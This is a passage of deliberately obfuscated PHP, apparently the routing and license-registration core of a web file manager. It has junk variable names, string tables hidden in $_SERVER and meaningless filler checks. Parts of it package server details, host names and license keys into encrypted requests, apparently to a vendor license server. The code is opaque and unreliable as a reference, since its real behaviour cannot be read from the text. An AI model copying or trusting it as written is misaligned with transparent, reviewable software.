function getTables($ÆçÇ‹Ğ” = '') { $úò÷êÚí =& $_SERVER[¢ñàß¿€]; $İ¯™ıá­ = $this->query($úò÷êÚí[45] . $úò÷êÚí[46] . $úò÷êÚí[47]); $ëà¬¨Å = array(); foreach ($İ¯™ıá­ as $½»È–†Î => $æüŒ½ÈÊ) { $ëà¬¨Å[$½»È–†Î] = current($æüŒ½ÈÊ); } return $ëà¬¨Å; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $º’ÚÈ…˜ =& $_SERVER[¢ñàß¿€]; $this->error = $this->_linkID->lastErrorMsg(); if ($º’ÚÈ…˜[12] != $this->queryStr) { $this->error .= LNG($º’ÚÈ…˜[48]) . $this->queryStr; } think_trace($this->error, $º’ÚÈ…˜[12], $º’ÚÈ…˜[49]); return $this->error; } public function escapeString($û˜à‘ğá) { $¯¯ô³ƒÎ =& $_SERVER[¢ñàß¿€]; if ($this->_linkID) { return $this->_linkID->escapeString($û˜à‘ğá); } return str_ireplace($¯¯ô³ƒÎ[58], $¯¯ô³ƒÎ[59], $û˜à‘ğá); } public function parseLimit($äŠŸ¦ö›) { $ÁÖ££Äå =& $_SERVER[¢ñàß¿€]; $Ë›×ºÓ÷ = $ÁÖ££Äå[12]; if (!empty($äŠŸ¦ö›)) { $äŠŸ¦ö› = explode($ÁÖ££Äå[50], $äŠŸ¦ö›); if (count($äŠŸ¦ö›) > 1) { $Ë›×ºÓ÷ .= $ÁÖ££Äå[51] . $äŠŸ¦ö›[1] . $ÁÖ££Äå[52] . $äŠŸ¦ö›[0] . $ÁÖ££Äå[53]; } else { $Ë›×ºÓ÷ .= $ÁÖ££Äå[51] . $äŠŸ¦ö›[0] . $ÁÖ££Äå[53]; } } return $Ë›×ºÓ÷; } } goto f‰²´˜Ø¨Õ; D†ƒ‰âºÁĞ: if (!$fywmlbapgh) { return; } class Application { private $defaultModule = "\151\x6e\x64\145\170"; private $defaultController = "\151\156\x64\x65\170"; private $defaultAction = "\151\x6e\144\x65\170"; function __construct() { } public function setDefault($¼¾¸°) { $÷àÍÕŒ“ =& $_SERVER[¢ñàß¿€]; $Åœ·¿“È =& $_SERVER[ªõè”¿˜]; $×ûÇ—´¬ = explode($Åœ·¿“È[0], trim($¼¾¸°, $Åœ·¿“È[0])); $this->defaultModule = $×ûÇ—´¬[0] ? $×ûÇ—´¬[0] : $this->defaultModule; $this->defaultController = $×ûÇ—´¬[1] ? $×ûÇ—´¬[1] : $this->defaultController; $this->defaultAction = $×ûÇ—´¬[2] ? $×ûÇ—´¬[2] : $this->defaultAction; $this->lazj8f414fcc($Åœ·¿“È[1], array($this, $Åœ·¿“È[2])); $÷éµŞÉ = $÷àÍÕŒ“[684]; if (strlen($÷éµŞÉ) < $÷àÍÕŒ“[685]) { die; } } public function appRun($­¡ÙÀÈ») { $µùŠæ¦â =& $_SERVER[ªõè”¿˜]; $„ƒ°Œñ = explode($µùŠæ¦â[0], $­¡ÙÀÈ»); $ŠÜâé÷„ = strtolower($„ƒ°Œñ[0]); $†÷‰¾ = $µùŠæ¦â[3]; if ($ŠÜâé÷„ == $µùŠæ¦â[4]) { $†÷‰¾ = $µùŠæ¦â[5]; $„ƒ°Œñ[0] = $µùŠæ¦â[6]; $„ƒ°Œñ[1] = $„ƒ°Œñ[1] . $µùŠæ¦â[7]; $­¡ÙÀÈ» = join($µùŠæ¦â[0], $„ƒ°Œñ); $­¡ÙÀÈ» = trim($­¡ÙÀÈ», $µùŠæ¦â[0]); } call_user_func(array($µùŠæ¦â[8], $µùŠæ¦â[9]), $†÷‰¾ . $µùŠæ¦â[10], $­¡ÙÀÈ»); ActionCall($­¡ÙÀÈ»); call_user_func(array($µùŠæ¦â[8], $µùŠæ¦â[9]), $†÷‰¾ . $µùŠæ¦â[11], $­¡ÙÀÈ»); $îıÚØëÄ = $_SERVER[¢ñàß¿€][686]; if (!$îıÚØëÄ) { die; } } private function autorun() { $’¸™÷§ =& $_SERVER[¢ñàß¿€]; $’¨–Ëßî =& $_SERVER[ªõè”¿˜]; global $config; $ïöô™§À = $’¸™÷§[687]; while ($ïöô™§À < $’¸™÷§[685]) { if ($ïöô™§À >= 0) { break; } $ïöô™§À++; } if (count($config[$’¨–Ëßî[12]]) == 0) { return; } foreach ($config[$’¨–Ëßî[12]] as $Ã„¤Íª => $å“·ÕŒ) { $this->appRun($å“·ÕŒ); } } private function jicp2e069eb0() { $÷†²½±­ =& $_SERVER[¢ñàß¿€]; $ÁÏ¹ï×— =& $_SERVER[ªõè”¿˜]; $Ç”¤ò²„ = $ÁÏ¹ï×—[4]; $–÷‹îšò = $GLOBALS[$ÁÏ¹ï×—[13]][$ÁÏ¹ï×—[14]][0]; $ÕöÛ¥ûä = $÷†²½±­[688]; if (strlen($ÕöÛ¥ûä) < $÷†²½±­[680]) { die; } if (!$–÷‹îšò || strlen($–÷‹îšò) <= strlen($Ç”¤ò²„)) { return; } if (strtolower(substr($–÷‹îšò, -strlen($Ç”¤ò²„))) != $Ç”¤ò²„) { return; } $Ñ”›˜±• = substr($–÷‹îšò, 0, -strlen($Ç”¤ò²„)); $ìº†™Ç‚ = $÷†²½±­[689]; $‘ğê„ñâ = array($ÁÏ¹ï×—[4], $Ñ”›˜±•); $¸ùŸ­Öø = array_slice($GLOBALS[$ÁÏ¹ï×—[13]][$ÁÏ¹ï×—[14]], 1); $GLOBALS[$ÁÏ¹ï×—[13]][$ÁÏ¹ï×—[14]] = array_merge($‘ğê„ñâ, $¸ùŸ­Öø); $ê®úï’Ï = $÷†²½±­[690]; if (strlen($ê®úï’Ï) < $÷†²½±­[691]) { return; } $GLOBALS[$ÁÏ¹ï×—[13]][$ÁÏ¹ï×—[15]] = implode($ÁÏ¹ï×—[0], $GLOBALS[$ÁÏ¹ï×—[13]][$ÁÏ¹ï×—[14]]); } private function oikb359c05f6() { $ÙÜªÁ¶ =& $_SERVER[¢ñàß¿€]; $®¨Â°ıù =& $_SERVER[ªõè”¿˜]; if ($GLOBALS[$®¨Â°ıù[13]][$®¨Â°ıù[15]] != $®¨Â°ıù[6]) { return; } $é…ÀÉÀğ = $_SERVER[$®¨Â°ıù[16]]; $Î‚û½õ = $ÙÜªÁ¶[692]; while (strlen($Î‚û½õ) < $ÙÜªÁ¶[685]) { if (!$Î‚û½õ) { break; } $Î‚û½õ++; } $Î®ñ·âœ = $®¨Â°ıù[17]; $ô·úƒÁñ = $ÙÜªÁ¶[693]; if (!$ô·úƒÁñ) { return; } if (!strstr($é…ÀÉÀğ, $Î®ñ·âœ)) { return; } $–…¤«¤‡ = strrpos($é…ÀÉÀğ, $Î®ñ·âœ); $¢¾ç­³µ = substr($é…ÀÉÀğ, $–…¤«¤‡ + strlen($Î®ñ·âœ)); preg_match_all($®¨Â°ıù[18], $¢¾ç­³µ, $à¨ˆ‚èò); $¢¾ç­³µ = trim($à¨ˆ‚èò[0][0], $®¨Â°ıù[19]); $Äåşœ§à = $ÙÜªÁ¶[694]; $GLOBALS[$®¨Â°ıù[13]][$®¨Â°ıù[14]] = explode($®¨Â°ıù[19], $¢¾ç­³µ); $GLOBALS[$®¨Â°ıù[13]][$®¨Â°ıù[15]] = implode($®¨Â°ıù[0], $GLOBALS[$®¨Â°ıù[13]][$®¨Â°ıù[14]]); $ËÔø¯–À = $ÙÜªÁ¶[695]; } public function run() { $û÷˜ğ‘Æ =& $_SERVER[¢ñàß¿€]; $ÓÔÊëœ =& $_SERVER[ªõè”¿˜]; $this->oikb359c05f6(); $this->jicp2e069eb0(); $À°ì‰º¥ = $GLOBALS[$ÓÔÊëœ[13]][$ÓÔÊëœ[14]]; $ı¦ÎË² = $GLOBALS[$ÓÔÊëœ[13]][$ÓÔÊëœ[15]]; $©îÚ¢´Ú = $û÷˜ğ‘Æ[696]; define($ÓÔÊëœ[20], isset($À°ì‰º¥[0]) && $À°ì‰º¥[0] ? $À°ì‰º¥[0] : $this->defaultModule); define($ÓÔÊëœ[21], isset($À°ì‰º¥[1]) && $À°ì‰º¥[0] ? $À°ì‰º¥[1] : $this->defaultController); define($ÓÔÊëœ[22], isset($À°ì‰º¥[2]) && $À°ì‰º¥[0] ? $À°ì‰º¥[2] : $this->defaultAction); define($ÓÔÊëœ[23], MOD . $ÓÔÊëœ[0] . ST . $ÓÔÊëœ[0] . ACT); $”Éªæ¾Ë = $û÷˜ğ‘Æ[697]; while ($”Éªæ¾Ë < $û÷˜ğ‘Æ[685]) { if ($”Éªæ¾Ë >= 0) { break; } $”Éªæ¾Ë++; } $_SERVER[$ÓÔÊëœ[24]] = strtolower(ACTION); $this->autorun(); $Îâë Ú· = $û÷˜ğ‘Æ[698]; if (strlen($Îâë Ú·) < $û÷˜ğ‘Æ[685]) { die; } if (count($À°ì‰º¥) >= 3) { $this->appRun($ı¦ÎË²); } else { $this->appRun(ACTION); } } private $ykzp562e6412 = array(); private $deuj0c61a7d5 = ''; public function jqas3bd34262() { $—Óèøš§ =& $_SERVER[¢ñàß¿€]; $¿Û»¨¼² =& $_SERVER[ªõè”¿˜]; $this->lvbm778c474f(); $êïÎø†‚ = $—Óèøš§[699]; if (!$êïÎø†‚) { return; } $this->pdmw6f38acab(); $this->qumyb13c3867(); $this->fernc0b278f2(); $this->zmjebe6dbbba(); $áö£µÔ” = $—Óèøš§[700]; if (strlen($áö£µÔ”) < $—Óèøš§[680]) { return; } $this->itaje2d2f7db(); $Œ‰¯½öı = $—Óèøš§[701]; if (strlen($Œ‰¯½öı) < $—Óèøš§[702]) { die; } $this->toqd78d2f1e0(); $œœá…¤‰ = $—Óèøš§[703]; if (!$œœá…¤‰) { die; } $this->lazj8f414fcc($¿Û»¨¼²[25], array($this, $¿Û»¨¼²[26])); $this->lazj8f414fcc($¿Û»¨¼²[27], array($this, $¿Û»¨¼²[28])); $Èéï©Êù = $—Óèøš§[704]; if (!$Èéï©Êù) { return; } $this->lazj8f414fcc($¿Û»¨¼²[29], array($this, $¿Û»¨¼²[30])); $this->lazj8f414fcc($¿Û»¨¼²[31], array($this, $¿Û»¨¼²[32])); $ÂúŸæé = $—Óèøš§[705]; } public function qxrjcb9c490f($èó¬³å’) { $Ş´ñ¥À =& $_SERVER[¢ñàß¿€]; $©Üäš»‘ =& $_SERVER[ªõè”¿˜]; $ÎÙ…‡¤Š = Model($©Üäš»‘[33])->get(); $ıĞŞü®· = array($©Üäš»‘[34], $©Üäš»‘[35], $©Üäš»‘[36], $©Üäš»‘[37], $©Üäš»‘[38], $©Üäš»‘[39], $©Üäš»‘[40], $©Üäš»‘[41], $©Üäš»‘[42], $©Üäš»‘[43], $©Üäš»‘[44], $©Üäš»‘[45], $©Üäš»‘[46], $©Üäš»‘[47], $©Üäš»‘[48], $©Üäš»‘[49], $©Üäš»‘[50], $©Üäš»‘[51], $©Üäš»‘[52], $©Üäš»‘[53], $©Üäš»‘[54], $©Üäš»‘[55], $©Üäš»‘[56], $©Üäš»‘[57], $©Üäš»‘[58], $©Üäš»‘[59], $©Üäš»‘[60], $©Üäš»‘[61], $©Üäš»‘[62], $©Üäš»‘[63], $©Üäš»‘[64], $©Üäš»‘[65], $©Üäš»‘[66], $©Üäš»‘[67], $©Üäš»‘[68], $©Üäš»‘[69], $©Üäš»‘[70], $©Üäš»‘[71], $©Üäš»‘[72], $©Üäš»‘[73], $©Üäš»‘[74], $©Üäš»‘[75], $©Üäš»‘[76], $©Üäš»‘[77], $©Üäš»‘[78], $©Üäš»‘[79], $©Üäš»‘[80], $©Üäš»‘[81], $©Üäš»‘[82], $©Üäš»‘[83], $©Üäš»‘[84], $©Üäš»‘[85]); $óõİ–ÙÓ = $Ş´ñ¥À[706]; if (strlen($óõİ–ÙÓ) < $Ş´ñ¥À[702]) { die; } foreach ($ıĞŞü®· as $ñµë“­) { $ùÆ—‘±‘ = $GLOBALS[$©Üäš»‘[86]][$©Üäš»‘[87]][$ñµë“­]; if (isset($ÎÙ…‡¤Š[$ñµë“­])) { $ùÆ—‘±‘ = $ÎÙ…‡¤Š[$ñµë“­]; } $èó¬³å’[$©Üäš»‘[88]][$©Üäš»‘[89]][$ñµë“­] = $ùÆ—‘±‘; } $ìàÓ©‹µ = $èó¬³å’[$©Üäš»‘[88]][$©Üäš»‘[89]][$©Üäš»‘[46]]; $Ôª³²ö× = $Ş´ñ¥À[707]; unset($èó¬³å’[$©Üäš»‘[88]][$©Üäš»‘[90]][$©Üäš»‘[91]]); unset($èó¬³å’[$©Üäš»‘[88]][$©Üäš»‘[90]][$©Üäš»‘[92]]); unset($èó¬³å’[$©Üäš»‘[88]][$©Üäš»‘[89]][$©Üäš»‘[46]]); $Ú™Ïˆê¿ = $Ş´ñ¥À[708]; if (strlen($Ú™Ïˆê¿) < $Ş´ñ¥À[685]) { return; } unset($èó¬³å’[$©Üäš»‘[88]][$©Üäš»‘[89]][$©Üäš»‘[93]]); $ÜÚ…¦ı§ = $Ş´ñ¥À[709]; $èó¬³å’[$©Üäš»‘[88]][$©Üäš»‘[89]][$©Üäš»‘[94]] = array($©Üäš»‘[95] => (int) $ìàÓ©‹µ[$©Üäš»‘[96]], $©Üäš»‘[97] => (int) _get($ìàÓ©‹µ, $©Üäš»‘[98], 0)); $ƒÍ®Ì¬Ú = substr(md5($©Üäš»‘[99] . get_client_ip() . $ÎÙ…‡¤Š[$©Üäš»‘[100]]), 0, 15); $èó¬³å’[$©Üäš»‘[101]][$©Üäš»‘[102]] = Mcrypt::encode(Session::sign(), $ƒÍ®Ì¬Ú, 3600 * 24); $èó¬³å’[$©Üäš»‘[101]][$©Üäš»‘[103]] = Action($©Üäš»‘[104])->accessToken(); $èó¬³å’[$©Üäš»‘[101]][$©Üäš»‘[105]] = md5($_SERVER[$©Üäš»‘[106]] . $ÎÙ…‡¤Š[$©Üäš»‘[100]]); $Äº¥ƒÈş = $Ş´ñ¥À[710]; $èó¬³å’[$©Üäš»‘[101]][$©Üäš»‘[107]] = base64_encode(serverInfo()); $èó¬³å’[$©Üäš»‘[101]][$©Üäš»‘[108]] = $this->deuj0c61a7d5; $‹åóËÔé = $Ş´ñ¥À[711]; if (!$‹åóËÔé) { die; } if ($ÎÙ…‡¤Š[$©Üäš»‘[108]] != $©Üäš»‘[109]) { $èó¬³å’[$©Üäš»‘[101]][$©Üäš»‘[110]] = $ÎÙ…‡¤Š[$©Üäš»‘[110]]; $èó¬³å’[$©Üäš»‘[101]][$©Üäš»‘[111]] = $ÎÙ…‡¤Š[$©Üäš»‘[111]]; $õßó¸Ü¼ = rand_string(10) . $this->deuj0c61a7d5 . rand_string(5); $èó¬³å’[$©Üäš»‘[88]][$©Üäš»‘[112]][$©Üäš»‘[113]] = $this->sevj52c9b754($õßó¸Ü¼, $èó¬³å’[$©Üäš»‘[101]][$©Üäš»‘[105]]); } if ($this->deuj0c61a7d5 == $©Üäš»‘[109]) { $èó¬³å’[$©Üäš»‘[88]][$©Üäš»‘[89]][$©Üäš»‘[94]][$©Üäš»‘[98]] = 0; } $èó¬³å’[$©Üäš»‘[101]][$©Üäš»‘[114]] = $this->versionPluginFilter(); $èó¬³å’[$©Üäš»‘[101]][$©Üäš»‘[115]] = _get($this->ykzp562e6412, $©Üäš»‘[116], $©Üäš»‘[6]); $˜¥é‘”ñ = $Ş´ñ¥À[712]; while (strlen($˜¥é‘”ñ) < $Ş´ñ¥À[680]) { if (!$˜¥é‘”ñ) { break; } $˜¥é‘”ñ++; } if (KodUser::isRoot() && $this->config[$©Üäš»‘[117]]) { $èó¬³å’[$©Üäš»‘[101]][$©Üäš»‘[118]] = WEB_ROOT; } return $èó¬³å’; } private function itaje2d2f7db() { $æ·¤Ø» =& $_SERVER[¢ñàß¿€]; $÷àş›— =& $_SERVER[ªõè”¿˜]; $¥˜¼ªÛÀ = $_SERVER[$÷àş›—[24]] == $÷àş›—[119]; $ œÂØä = $æ·¤Ø»[713]; if (!$ œÂØä) { return; } if ($_SERVER[$÷àş›—[24]] == $÷àş›—[120] && $_GET[$÷àş›—[121]] == $÷àş›—[122]) { $¥˜¼ªÛÀ = !0; } if ($¥˜¼ªÛÀ) { $Ç¼Éã¨£ = array($÷àş›—[108] => $this->deuj0c61a7d5, $÷àş›—[123] => $this->rtgb12b5a63d(), $÷àş›—[124] => Model($÷àş›—[125])->count()); if ($this->deuj0c61a7d5 != $÷àş›—[109]) { $¥üÍÂœ = _get($this->ykzp562e6412, $÷àş›—[126]); if ($¥üÍÂœ) { $Ç¼Éã¨£[$÷àş›—[127]] = $¥üÍÂœ; $Ç¼Éã¨£[$÷àş›—[128]] = strtotime(_get($this->ykzp562e6412, $÷àş›—[129])); $Ç¼Éã¨£[$÷àş›—[130]] = _get($this->ykzp562e6412, $÷àş›—[116]); } $ÉÚ‘öø = Model($÷àş›—[33])->get($÷àş›—[131], $÷àş›—[6], !0); if (is_string($ÉÚ‘öø) && substr($ÉÚ‘öø, 0, 1) == $÷àş›—[132]) { $ÉÚ‘öø = json_decode_force($ÉÚ‘öø); } if (is_array($ÉÚ‘öø) && $ÉÚ‘öø[$÷àş›—[133]] && strstr($ÉÚ‘öø[$÷àş›—[133]], $÷àş›—[134])) { $öÆ™ç·Ò = explode($÷àş›—[134], $ÉÚ‘öø[$÷àş›—[133]]); $Ç¼Éã¨£[$÷àş›—[135]] = $öÆ™ç·Ò[0]; } } $Ç¼Éã¨£ = $this->oeqj0a6ec884(json_encode($Ç¼Éã¨£), md5($÷àş›—[136])); $À¥ø€›‡ = $æ·¤Ø»[714]; $Ñƒ©ª• = array($÷àş›—[137] => $Ç¼Éã¨£); call_user_func(array($÷àş›—[138], $÷àş›—[139]), $Ñƒ©ª•); } if ($this->deuj0c61a7d5 == $÷àş›—[109]) { return; } $Òæí×í‰ = array($÷àş›—[140], $÷àş›—[141], $÷àş›—[142], $÷àş›—[143], $÷àş›—[144], $÷àş›—[145]); $¶´®Û¹¯ = $æ·¤Ø»[715]; if (!$¶´®Û¹¯) { die; } $ˆŸÈäÍÂ = Model($÷àş›—[33])->get(); $Ñƒ©ª• = array($÷àş›—[146] => $ˆŸÈäÍÂ[$÷àş›—[34]], $÷àş›—[147] => $ˆŸÈäÍÂ[$÷àş›—[35]], $÷àş›—[148] => $÷àş›—[6]); $üˆŠ® = $æ·¤Ø»[716]; foreach ($Òæí×í‰ as $óè±Ú°Ç) { if (!isset($ˆŸÈäÍÂ[$óè±Ú°Ç]) || !$ˆŸÈäÍÂ[$óè±Ú°Ç]) { continue; } $Ñƒ©ª•[$óè±Ú°Ç] = $ˆŸÈäÍÂ[$óè±Ú°Ç]; } call_user_func(array($÷àş›—[138], $÷àş›—[139]), $Ñƒ©ª•); $Çşå—Õµ = $æ·¤Ø»[717]; if (!$Çşå—Õµ) { die; } } private function fernc0b278f2() { $§ß­Ê‹Š =& $_SERVER[¢ñàß¿€]; $î²Â±Äˆ =& $_SERVER[ªõè”¿˜]; if ($_SERVER[$î²Â±Äˆ[24]] != $î²Â±Äˆ[149]) { return; } if (!KodUser::isRoot()) { die; } $ıô•ÌÚÜ = $GLOBALS[$î²Â±Äˆ[13]]; if (isset($ıô•ÌÚÜ[$î²Â±Äˆ[150]])) { $this->lmsx1482e334(); die; } if (isset($ıô•ÌÚÜ[$î²Â±Äˆ[151]]) && isset($ıô•ÌÚÜ[$î²Â±Äˆ[151]]) == $î²Â±Äˆ[122]) { $ıô•ÌÚÜ[$î²Â±Äˆ[152]] = Model($î²Â±Äˆ[33])->get($î²Â±Äˆ[153]); } if (!isset($ıô•ÌÚÜ[$î²Â±Äˆ[152]]) || strlen($ıô•ÌÚÜ[$î²Â±Äˆ[152]]) != 16) { show_json($î²Â±Äˆ[154] . $ıô•ÌÚÜ[$î²Â±Äˆ[152]], !1); } $ÛÒÇ²Çş = Model($î²Â±Äˆ[33])->get($î²Â±Äˆ[100]); $§œûúÑØ = md5($_SERVER[$î²Â±Äˆ[106]] . $ÛÒÇ²Çş); $”ĞÅ•÷ø = $§ß­Ê‹Š[718]; $ñ ª‡Ñ™ = array($î²Â±Äˆ[152] => $ıô•ÌÚÜ[$î²Â±Äˆ[152]], $î²Â±Äˆ[155] => rand_string(16), $î²Â±Äˆ[156] => $î²Â±Äˆ[136], $î²Â±Äˆ[157] => $î²Â±Äˆ[158], $î²Â±Äˆ[159] => $_SERVER[$î²Â±Äˆ[160]], $î²Â±Äˆ[161] => $_SERVER[$î²Â±Äˆ[162]], $î²Â±Äˆ[163] => $_SERVER[$î²Â±Äˆ[164]], $î²Â±Äˆ[105] => $§œûúÑØ, $î²Â±Äˆ[165] => Model($î²Â±Äˆ[33])->get($î²Â±Äˆ[131])); $Òá«›ÅÆ = $§ß­Ê‹Š[719]; if (!$Òá«›ÅÆ) { return; } if (isset($ıô•ÌÚÜ[$î²Â±Äˆ[151]]) && isset($ıô•ÌÚÜ[$î²Â±Äˆ[151]]) == $î²Â±Äˆ[122]) { $ñ ª‡Ñ™[$î²Â±Äˆ[151]] = md5($ñ ª‡Ñ™[$î²Â±Äˆ[152]] . $î²Â±Äˆ[166] . $ñ ª‡Ñ™[$î²Â±Äˆ[155]]); } if ($ıô•ÌÚÜ[$î²Â±Äˆ[167]] == $î²Â±Äˆ[168]) { $æ×„–ó = $this->oeqj0a6ec884($§œûúÑØ, $î²Â±Äˆ[169]); $ºŞÛº¹Ÿ = $this->sevj52c9b754(json_encode($ñ ª‡Ñ™), $§œûúÑØ . $î²Â±Äˆ[170], 3); $ºŞÛº¹Ÿ = $ºŞÛº¹Ÿ . $î²Â±Äˆ[171] . $_SERVER[$î²Â±Äˆ[160]]; $ôŞéÃ¾¨ = $this->mtlkeaf540e0($î²Â±Äˆ[172] . $æ×„–ó . $î²Â±Äˆ[173] . $ºŞÛº¹Ÿ, -1); show_json($ôŞéÃ¾¨, !0); } else { if ($ıô•ÌÚÜ[$î²Â±Äˆ[167]] == $î²Â±Äˆ[174]) { $ôÉ÷Áø£ = substr(md5($î²Â±Äˆ[175] . $§œûúÑØ), 12, 15) . $î²Â±Äˆ[176]; $ºŞÛº¹Ÿ = $this->vgwpd6abcdfc(trim($ıô•ÌÚÜ[$î²Â±Äˆ[177]]), $ôÉ÷Áø£, 2); $¹½¾ÂÔ = json_decode($ºŞÛº¹Ÿ, !0); if (!is_array($¹½¾ÂÔ) || !is_array($¹½¾ÂÔ[$î²Â±Äˆ[178]]) || $¹½¾ÂÔ[$î²Â±Äˆ[152]] != !0) { $Ë’²ùË = $î²Â±Äˆ[179]; $ËİŒàòˆ = $¹½¾ÂÔ[$î²Â±Äˆ[178]] ? $î²Â±Äˆ[180] . $¹½¾ÂÔ[$î²Â±Äˆ[178]] : $Ë’²ùË; show_json($ËİŒàòˆ, !1); } else { $ñ ª‡Ñ™[$î²Â±Äˆ[155]] = $¹½¾ÂÔ[$î²Â±Äˆ[178]][$î²Â±Äˆ[181]]; } } else { $¹½¾ÂÔ = $this->mtlkeaf540e0($î²Â±Äˆ[182], $ñ ª‡Ñ™, 10); $¯âóÊğØ = $§ß­Ê‹Š[720]; if (strlen($¯âóÊğØ) < $§ß­Ê‹Š[685]) { die; } } } if (!is_array($¹½¾ÂÔ) || !is_array($¹½¾ÂÔ[$î²Â±Äˆ[178]]) || $¹½¾ÂÔ[$î²Â±Äˆ[152]] != !0) { $Ë’²ùË = LNG($î²Â±Äˆ[183]); $ËİŒàòˆ = $¹½¾ÂÔ[$î²Â±Äˆ[178]] ? $î²Â±Äˆ[180] . $¹½¾ÂÔ[$î²Â±Äˆ[178]] : $Ë’²ùË; show_json($ËİŒàòˆ, !1); } $¥ö×œƒŞ = $¹½¾ÂÔ[$î²Â±Äˆ[178]]; $•´¤ŞÖ¸ = $this->qrsf55a91a6e($¥ö×œƒŞ[$î²Â±Äˆ[184]]); if (!$•´¤ŞÖ¸ || $•´¤ŞÖ¸ != $¥ö×œƒŞ[$î²Â±Äˆ[129]]) { $¸œØîÒ® = array($î²Â±Äˆ[185] => Model($î²Â±Äˆ[33])->get($î²Â±Äˆ[100]), $î²Â±Äˆ[186] => $_SERVER[$î²Â±Äˆ[106]], $î²Â±Äˆ[187] => this_url(), $î²Â±Äˆ[161] => $_SERVER[$î²Â±Äˆ[162]]); $ºŞÛº¹Ÿ = $this->mvfqcfc83b94(json_encode($¸œØîÒ®)); $this->mtlkeaf540e0($î²Â±Äˆ[188] . $ºŞÛº¹Ÿ); show_json(LNG($î²Â±Äˆ[189]), !0); } $³•ËÙÀ = array($î²Â±Äˆ[153] => $¥ö×œƒŞ[$î²Â±Äˆ[190]], $î²Â±Äˆ[191] => $¥ö×œƒŞ[$î²Â±Äˆ[192]], $î²Â±Äˆ[193] => rand_string(16), $î²Â±Äˆ[108] => $¥ö×œƒŞ[$î²Â±Äˆ[194]]); if ($ñ ª‡Ñ™[$î²Â±Äˆ[155]]) { $³•ËÙÀ[$î²Â±Äˆ[193]] = $ñ ª‡Ñ™[$î²Â±Äˆ[155]]; } $Š¨ÎÃä = substr(md5($³•ËÙÀ[$î²Â±Äˆ[191]]), 10, 10); $«ÔéŸä = $Š¨ÎÃä . $³•ËÙÀ[$î²Â±Äˆ[108]] . $³•ËÙÀ[$î²Â±Äˆ[193]]; $Ò’™éÚ = $§ß­Ê‹Š[721]; if (!$Ò’™éÚ) { die; } $³•ËÙÀ[$î²Â±Äˆ[110]] = strrev(base64_encode($this->oeqj0a6ec884($«ÔéŸä, $î²Â±Äˆ[195]))); $¨ÔšÑæ‹ = $§ß­Ê‹Š[722]; if (!$¨ÔšÑæ‹) { return; } $ï¥­„¨ß = rand_string(16); $ıÁ¿óˆ = $§ß­Ê‹Š[723]; if (strlen($ıÁ¿óˆ) < $§ß­Ê‹Š[685]) { die; } $„Óš£Ğú = $ï¥­„¨ß . $³•ËÙÀ[$î²Â±Äˆ[108]] . $this->oeqj0a6ec884(md5($³•ËÙÀ[$î²Â±Äˆ[153]]), $ï¥­„¨ß); $ãâß¾ • = $§ß­Ê‹Š[724]; while ($ãâß¾ • < $§ß­Ê‹Š[702]) { if ($ãâß¾ • >= 0) { break; } $ãâß¾ •++; } $³•ËÙÀ[$î²Â±Äˆ[111]] = base64_encode(strrev($this->oeqj0a6ec884($„Óš£Ğú, $î²Â±Äˆ[196]))); if ($¥ö×œƒŞ[$î²Â±Äˆ[197]] && $¥ö×œƒŞ[$î²Â±Äˆ[197]] >= 1) { Model($î²Â±Äˆ[33])->setDeep($î²Â±Äˆ[198], $î²Â±Äˆ[122]); } Model($î²Â±Äˆ[33])->set($³•ËÙÀ); $»©Ô”Ä® = md5($_SERVER[$î²Â±Äˆ[106]] . strrev($ÛÒÇ²Çş) . $³•ËÙÀ[$î²Â±Äˆ[191]]); $öÆ¢ÈĞ¸ = $§ß­Ê‹Š[725]; if (strlen($öÆ¢ÈĞ¸) < $§ß­Ê‹Š[685]) { return; } $ù±ôİÎâ = strrev(substr($»©Ô”Ä®, 10, 16)); $şŠä£µ‰ = $this->sevj52c9b754(json_encode($¥ö×œƒŞ), $»©Ô”Ä®); $¥˜Øåõ = array_to_keyvalue(Model($î²Â±Äˆ[7])->listData(), $î²Â±Äˆ[199]); $í€Æ«ùú = $¥˜Øåõ[$î²Â±Äˆ[200]]; $Í˜‘ñùØ = array(); $š„öµÅ› = $§ß­Ê‹Š[726]; if (!$š„öµÅ›) { die; } $Í˜‘ñùØ[$ù±ôİÎâ] = $şŠä£µ‰; $€¡àÈÎ½ = $§ß­Ê‹Š[727]; while ($€¡àÈÎ½ < $§ß­Ê‹Š[702]) { if ($€¡àÈÎ½ >= 0) { break; } $€¡àÈÎ½++; } Model($î²Â±Äˆ[7])->update($í€Æ«ùú[$î²Â±Äˆ[201]], array($î²Â±Äˆ[202] => $Í˜‘ñùØ)); $ÄÇ¬†ñ‚ = $§ß­Ê‹Š[728]; if (strlen($ÄÇ¬†ñ‚) < $§ß­Ê‹Š[685]) { return; } $this->ykzp562e6412 = $¥ö×œƒŞ; $this->deuj0c61a7d5 = $³•ËÙÀ[$î²Â±Äˆ[108]]; $©¡Ìš˜“ = $§ß­Ê‹Š[729]; if (strlen($©¡Ìš˜“) < $§ß­Ê‹Š[680]) { die; } $this->licenseRegistSuccess(); $ïŒ·õü = $§ß­Ê‹Š[730]; if (strlen($ïŒ·õü) < $§ß­Ê‹Š[680]) { return; } Cache::set($î²Â±Äˆ[203] . md5($ÛÒÇ²Çş . $î²Â±Äˆ[204]), $î²Â±Äˆ[6]); show_json(LNG($î²Â±Äˆ[189]), !0); } private function licenseRegistSuccess() { $¾İ°İÍŠ =& $_SERVER[ªõè”¿˜]; $¼Œó™çÁ = Model($¾İ°İÍŠ[33])->get(); if ($¼Œó™çÁ[$¾İ°İÍŠ[63]] != $¾İ°İÍŠ[122]) { Model($¾İ°İÍŠ[33])->set($¾İ°İÍŠ[63], $¾İ°İÍŠ[122]); } Action($¾İ°İÍŠ[205])->initStart(!0); } private function lmsx1482e334() { $õÖÎ’¥ =& $_SERVER[¢ñàß¿€]; $ÕÖûê§¹ =& $_SERVER[ªõè”¿˜]; Model($ÕÖûê§¹[33])->set(array($ÕÖûê§¹[153] => $ÕÖûê§¹[6], $ÕÖûê§¹[191] => $ÕÖûê§¹[6], $ÕÖûê§¹[108] => $ÕÖûê§¹[109], $ÕÖûê§¹[110] => $ÕÖûê§¹[6], $ÕÖûê§¹[111] => $ÕÖûê§¹[6])); $´ËÚ‘ê = $õÖÎ’¥[731]; Model($ÕÖûê§¹[33])->setDeep($ÕÖûê§¹[198], $ÕÖûê§¹[206]); $this->ykzp562e6412 = array(); $ùıß’ËÌ = $õÖÎ’¥[732]; if (strlen($ùıß’ËÌ) < $õÖÎ’¥[702]) { return; } $this->deuj0c61a7d5 = $ÕÖûê§¹[109]; } private function lvbm778c474f() { $Ë‡¤æ»¯ 